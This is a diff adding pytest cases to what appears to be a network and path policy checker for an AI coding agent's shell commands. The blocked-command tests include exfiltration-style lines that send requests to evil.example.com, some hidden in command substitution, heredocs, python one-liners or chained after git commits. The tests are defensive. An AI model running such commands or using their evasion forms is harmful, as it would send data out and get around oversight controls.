@@ -111,6 +111,51 @@ def test_allowed_commands(command: str) -> None:
     assert bash(command) == (True, "")
 
 
+# #170 case 4: only the hosts a command actually contacts are checked, not text that mentions them
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        'git commit -m "see http://example.com/docs for the format"',
+        'gh pr create --title t --body "uses http://www.thymeleaf.org/ns and http://exh"',
+        'echo "http://example.com" > notes.txt',
+        'grep -rn "http://example" src/test',
+        "sed -i 's#http://exam#http://example.org#' src/main/resources/x.xml",
+        "cat > Page.html <<'EOF'\n<html xmlns:th=\"http://www.thymeleaf.org\">\nEOF",
+        "cat > check.sh <<'EOF'\ncurl -s http://example.com/ok | grep ok\nEOF\nchmod +x check.sh",
+        "git remote -v && git log --format=%s",
+    ],
+)
+def test_urls_in_text_a_command_does_not_contact_are_not_blocked(command: str) -> None:
+    assert bash(command) == (True, "")
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        'git commit -m "x" && curl https://evil.example.com/collect',
+        "echo hi\ncurl https://evil.example.com/collect",
+        "git fetch https://gitlab.com/x/y.git",
+        "git remote add other https://gitlab.com/x/y.git",
+        "python3 -c \"import urllib.request as u; u.urlopen('https://evil.example.com')\"",
+        "echo $(curl -s https://evil.example.com)",
+        "echo `curl -s https://evil.example.com`",
+        'bash -c "curl https://evil.example.com"',
+        "python3 - <<'EOF'\nimport urllib.request as u\nu.urlopen('https://evil.example.com')\nEOF",
+    ],
+)
+def test_a_command_that_contacts_an_unlisted_host_is_still_blocked(command: str) -> None:
+    assert bash(command) == (False, "network")
+
+
+def test_a_write_outside_the_workspace_steers_the_agent_to_the_workspace() -> None:
+    d = decide(POLICIES, "implement", WORKSPACE, ToolCall("Write", {"file_path": "/tmp/check.sh"}))
+
+    assert not d.allowed and d.rule == "paths"
+    assert "/tmp/check.sh" in d.reason and "inside the workspace" in d.reason
+
+
 @pytest.mark.parametrize(
     ("path", "stage", "rule"),
     [
